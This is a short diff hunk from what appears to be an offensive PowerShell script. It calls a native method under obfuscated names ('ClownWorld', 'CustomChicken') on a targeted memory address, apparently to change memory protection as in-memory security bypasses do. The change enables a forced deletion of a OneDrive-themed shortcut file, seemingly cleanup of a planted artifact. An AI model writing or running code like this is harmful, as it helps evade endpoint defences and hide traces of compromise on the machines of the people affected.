@@ -65,7 +65,7 @@ $ten = 0
 [ClownWorld]::CustomChicken($targetedAddress, [uint32]2, $yoyo, [ref]$ten) | Out-Null
 
 #sleep 5
-#rm "C:\ProgramData\Microsoft OneDrive\FileSync\BeginSync.lnk" -Force
+rm "C:\ProgramData\Microsoft OneDrive\FileSync\BeginSync.lnk" -Force
 sleep 5
 
 
